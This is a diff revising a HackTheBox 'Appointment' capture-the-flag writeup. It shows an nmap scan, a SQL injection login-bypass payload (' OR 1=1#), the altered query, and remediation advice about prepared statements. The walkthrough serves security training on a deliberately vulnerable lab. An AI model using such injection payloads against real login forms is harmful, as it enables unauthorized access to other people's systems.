@@ -1,64 +1,54 @@
 # Appointment - HackTheBox Writeup 📅
 
-## 🚩 Room Information
-- **Platform:** [HackTheBox](https://app.hackthebox.com/)
-- **Track:** Starting Point - Tier 0
-- **Difficulty:** Very Easy
-- **Category:** Web Exploitation / SQL Injection
-- **Status:** ✅ Completed
+- **Platform:** HackTheBox (Starting Point - Tier 0)
+- **Target OS:** Linux
+- **Vulnerability:** Web Application SQL Injection (Auth Bypass)
 
 ---
 
-## 🎓 Learning Objectives
-- Understanding Web Application Authentication mechanisms.
-- Identifying and exploiting SQL Injection (**SQLi**) vulnerabilities.
-- Performing authentication bypass techniques using boolean logic manipulation.
+## 📌 Reconnaissance
 
----
+I ran Nmap to scan for open web services:
 
-## 🧠 Knowledge Required
-- Basic HTTP web concepts.
-- Understanding how SQL authentication queries process inputs.
-
----
-
-## 🔍 Step-by-Step Walkthrough
-
-### 1. Web Reconnaissance
-Scan the target for active web server ports:
 ```bash
 nmap -sV -p 80 <TARGET_IP>
 ```
-* **Discovered Open Port:** `80/tcp` running `Apache httpd 2.4.38`.
 
-Navigate to `http://<TARGET_IP>/` in a web browser to reveal an admin login screen.
+### Scan Results:
+- `80/tcp open http Apache httpd 2.4.38`
 
-### 2. Vulnerability Analysis
-The backend database query for authentication typically resembles:
+Visiting `http://<TARGET_IP>/` in the browser brought up an admin login page.
+
+---
+
+## ⚡ Exploitation
+
+I tested the login form for basic SQL Injection (SQLi) vulnerabilities.
+
+### Payload Used:
+- **Username:** `' OR 1=1#`
+- **Password:** `admin` *(anything works)*
+
+### How it works:
+The backend query probably looks like:
 ```sql
 SELECT * FROM users WHERE username = '$username' AND password = '$password';
 ```
-If input sanitization is missing, injecting raw SQL syntax can force the query condition to evaluate to `TRUE`.
 
-### 3. Exploitation (Authentication Bypass)
-Submit the following payload into the **Username** field:
-- **Username:** `' OR 1=1#` (or `' OR 1=1--`)
-- **Password:** `admin` *(or any arbitrary text)*
-
-The resulting SQL query becomes:
+Injecting `' OR 1=1#` turns it into:
 ```sql
 SELECT * FROM users WHERE username = '' OR 1=1#' AND password = '...';
 ```
-Since `1=1` is always true and `#` comments out the rest of the query, the database authenticates the request as the first user (typically `admin`).
-
-### 4. Flag Retrieval
-Upon successful bypass, the application redirects to the administrative dashboard displaying the root flag.
+Since `1=1` is true and `#` comments out the password condition, the query succeeds and logs in as the first user (`admin`).
 
 ---
 
-## 🛡️ Remediation & Key Takeaways
-- **Use Parameterized Queries:** Always use Prepared Statements (Parameterized Queries) to isolate data from SQL code execution.
-- **Input Validation:** Enforce strict server-side validation and sanitization on all user input fields.
+## 🚩 Flag Capture
+
+Submitting the payload bypassed authentication and displayed the admin dashboard along with the root flag.
 
 ---
-*Based on HackTheBox content. Compiled by [Amit Padhan](https://github.com/amitpadhan525)*
+
+## 💡 Notes & Takeaways
+- Never concatenate raw user input directly into SQL queries.
+- Always use Prepared Statements (Parameterized Queries) to prevent SQLi.
